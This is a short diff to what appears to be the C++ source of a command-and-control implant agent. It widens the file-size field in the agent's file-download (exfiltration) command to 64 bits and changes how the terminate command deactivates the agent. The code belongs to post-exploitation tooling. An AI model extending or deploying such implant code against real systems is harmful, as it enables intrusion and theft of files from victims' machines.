@@ -283,14 +283,16 @@ void Commander::CmdDownload(ULONG commandId, Packer* inPacker, Packer* outPacker
 	else {
 		CHAR  fullPath[MAX_PATH];
 		DWORD pathSize = ApiWin->GetFullPathNameA( filename, MAX_PATH, fullPath, NULL);
-		DWORD fileSize = ApiWin->GetFileSize( hFile, 0 );
+		DWORD fileSizeHigh = 0;
+		DWORD fileSizeLow  = ApiWin->GetFileSize( hFile, &fileSizeHigh );
+		ULONG64 fileSize   = ((ULONG64)fileSizeHigh << 32) | fileSizeLow;
 
 		if (pathSize > 0) {
 			DownloadData downloadData = this->agent->downloader->CreateDownloadData(taskId, hFile, fileSize);
 			outPacker->Pack32(COMMAND_DOWNLOAD);
 			outPacker->Pack32(downloadData.fileId);
 			outPacker->Pack8(DOWNLOAD_START);
-			outPacker->Pack32(downloadData.fileSize);
+			outPacker->Pack64(downloadData.fileSize);
 			outPacker->PackBytes((PBYTE)fullPath, pathSize);
 		}
 		else {
@@ -1048,7 +1050,7 @@ void Commander::CmdTerminate(ULONG commandId, Packer* inPacker, Packer* outPacke
 {
 	agent->config->exit_method  = inPacker->Unpack32();
 	agent->config->exit_task_id = inPacker->Unpack32();
-	agent->SetActive(FALSE);
+	agent->Active = FALSE;
 }
 
 void Commander::CmdTunnelMsgConnectTCP(ULONG commandId, Packer* inPacker, Packer* outPacker) 
